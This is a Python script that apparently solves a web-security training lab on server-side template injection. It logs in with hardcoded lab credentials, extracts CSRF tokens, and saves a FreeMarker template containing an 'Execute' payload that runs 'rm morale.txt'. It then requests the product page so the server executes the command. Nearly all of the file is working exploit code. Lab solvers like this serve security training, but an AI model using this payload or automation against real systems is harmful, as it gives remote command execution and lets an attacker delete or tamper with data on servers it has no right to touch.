import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Server-side template injection using documentation"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the login page and get the CSRF token and session cookie to login\n2. login as content-manager and fetch a product template\n3. Extract the csrf token to edit the template\n4. Edit the template and inject the malicious payload\n5. Fetch the product page after editing to execute the payload\n""")

    print(Fore.WHITE + "[1] Fetching the login page")
    try:
        login_page = requests.get(
            f"{url}/login", allow_redirects=False, verify=False, proxies=proxies)
        print(Fore.GREEN + "login page fetched")
    except:
        print(Fore.RED + "[!] Failed to fetch")

    print(Fore.WHITE + "[2] Extracting the csrf token and session")
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    print(Fore.WHITE + "[+] CSRF token: " + Fore.YELLOW + csrf_token)

    print(Fore.WHITE + "[3] login as content-manager")

    data = { "username": "content-manager", "password": "C0nt3ntM4n4g3r", "csrf": csrf_token }
    cookies = { "session": session }
    try:
        content_manager_login = requests.post(
            f"{url}/login", data=data, cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
        print(Fore.GREEN + "login as wiener")
    except:
        print(Fore.RED + "[!] Failed to fetch")

    print(Fore.WHITE + "[4] Fetching a product template")
    session = content_manager_login.cookies.get("session")
    cookies = {"session": session}
    try:
        template_page = requests.get(
            f"{url}/product/template?productId=1", cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
    except:
        print(Fore.RED + "[!] Failed to fetch")

    print(Fore.WHITE +
          "[5] Extracting the csrf token to edit the template")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", template_page.text)[0]
    

    print(Fore.WHITE + "[6] Editing the template and injecting the malicious payload")
    payload = """<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm morale.txt")}"""
    data = {  "template": payload, "csrf": csrf_token, "template-action": "save" }
    try:
        requests.post(
            f"{url}/product/template?productId=1", data=data, cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
    except:
        print(Fore.RED + "[!] Failed to fetch")

    print(Fore.WHITE + "[7] Fetching the product page after editing to execute the payload")
    try:
        requests.get(
            f"{url}/product?productId=1", cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
        print(Fore.WHITE + "The morale.txt file is successfully deleted")
        return True
    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
